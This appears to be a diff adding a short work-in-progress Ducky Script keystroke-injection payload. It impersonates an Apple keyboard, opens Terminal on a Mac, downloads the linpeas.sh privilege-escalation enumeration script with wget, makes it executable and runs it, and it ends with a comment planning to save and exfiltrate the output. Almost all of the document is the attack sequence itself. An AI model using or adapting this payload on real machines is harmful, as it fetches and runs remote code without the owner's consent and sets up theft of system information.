@@ -1,0 +1,20 @@
+REM FalsePhilospher
+REM WIP
+ID 05ac:021e Apple:Keyboard
+DELAY 300
+COMMAND SPACE
+DELAY 100
+STRING terminal.app
+DELAY 100
+ENTER
+DELAY 1000
+STRING wget https://github.com/carlospolop/PEASS-ng/releases/download/20220703/linpeas.sh
+DELAY 300
+ENTER
+STRING chmod +x linpeas.sh
+DELAY 300
+ENTER
+STRING ./linpeas.sh
+DELAY 300
+ENTER
+REM save output to file and exfil
